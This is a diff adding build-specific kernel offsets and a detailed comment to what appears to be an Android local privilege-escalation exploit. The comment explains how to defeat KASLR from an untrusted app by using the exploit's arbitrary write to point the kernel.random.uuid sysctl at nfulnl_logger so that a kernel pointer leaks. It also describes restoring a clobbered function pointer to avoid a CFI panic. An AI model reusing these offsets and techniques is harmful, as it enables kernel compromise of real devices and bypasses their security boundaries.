@@ -144,6 +144,57 @@
 // OK
 #define SLIDE_NFULNL_LOGGER_OFF 0x026eee50ULL //nfulnl_logger
 
+/*
+ * The perf-free KASLR slide (core510/slide.c, slide_stamp_leak_kernel_base).
+ *
+ * An application-launched run cannot call perf_event_open at all -- neither
+ * plat nor vendor policy gives untrusted_app the perf_event class -- so the
+ * histogram leak in q3slide.c answers EACCES and the run stops before it has
+ * touched anything. The slide then has to come out of the exploit's own
+ * arbitrary write, which is what these three name.
+ *
+ * random_table[] is the sysctl table in drivers/char/random.c. Entry 5 is
+ *
+ *     { .procname = "uuid", .mode = 0444, .proc_handler = proc_do_uuid }
+ *
+ * and it ships with .data NULL, which is what makes it the right entry to
+ * take over rather than boot_id's (entry 4):
+ *
+ *   - NULL is a clean "did the write land?" test. Reading the file with
+ *     .data still NULL gives a freshly generated random UUID, which fails
+ *     the kernel-pointer check; nothing has to distinguish our pointer from
+ *     a plausible pre-existing one.
+ *   - boot_id is load-bearing. libcutils derives /dev/ashmem<boot_id> from
+ *     it, and su_daemon's pin_boot_id() bind-mounts over it; retargeting it
+ *     wedges other processes and needs a restore before anything else runs.
+ *     Nothing on this device reads kernel.random.uuid.
+ *
+ * The anchor is &nfulnl_logger, whose 16 bytes proc_do_uuid then prints:
+ *
+ *     struct nf_logger { char *name; enum nf_log_type type; ... }
+ *     nfulnl_logger = { .name = "nfnetlink_log", .type = NF_LOG_TYPE_ULOG }
+ *
+ * so qword 0 is the slid address of the string (SLIDE_NFULNL_LOGGER_NAME_OFF
+ * is its unslid value, i.e. stext = leaked - that) and byte 8 is the type, 1.
+ * Byte 8 is not decoration: proc_do_uuid regenerates a random UUID *into*
+ * table->data when uuid[8] is zero, so an anchor whose ninth byte is zero
+ * corrupts itself and never leaks. &loggers[0][1], which core612 uses, is
+ * exactly such an anchor on this build -- loggers[0][2] is NULL.
+ *
+ * LOGFN_OFF is for putting things back. __rb_erase_augmented's case 2 does
+ * a second, unavoidable store -- __rb_change_child writes tmp into
+ * parent->rb_right, i.e. anchor + 0x10, i.e. nfulnl_logger.logfn. With
+ * CONFIG_CFI_CLANG=y and CONFIG_CFI_PERMISSIVE unset a call through that
+ * pointer is a panic, so the value is restored once the read/write
+ * primitive is up rather than left for whoever first uses NFLOG.
+ *
+ * All three were read out of the recovered image for THIS build; the v206
+ * target carries its own NAME_OFF because .rodata moved between them.
+ */
+#define SLIDE_RANDOM_UUID_DATA_OFF 0x027e64b8ULL   // &random_table[5].data (holds NULL)
+#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01cd0c86ULL // value of nfulnl_logger.name
+#define SLIDE_NFULNL_LOGGER_LOGFN_OFF 0x0142a9b0ULL // value of nfulnl_logger.logfn
+
 // PAGES
 #define LOCK_OFF 0x1000
 #define FOPS_OFF 0x2000
